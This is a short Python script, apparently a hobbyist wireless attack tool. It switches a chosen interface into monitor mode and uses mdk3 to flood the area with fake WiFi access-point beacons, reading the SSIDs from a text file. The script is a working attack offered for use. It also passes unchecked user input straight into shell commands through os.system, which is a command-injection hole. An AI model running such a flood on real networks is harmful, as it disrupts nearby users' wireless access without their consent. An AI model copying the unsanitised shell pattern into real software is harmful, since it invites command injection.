import os


os.system("iwconfig")
wlan = input("[+] Select an interface? : ")
os.system("clear")

print("[+] Process of creating WiFi / SSID . . .\n")

# making an adapter type monitor
os.system("sudo iw {} interface add mon0 type monitor".format(wlan))
# flooding WiFi
os.system("sudo mdk3 mon0 b -f files/ssid.txt")
os.system("clear")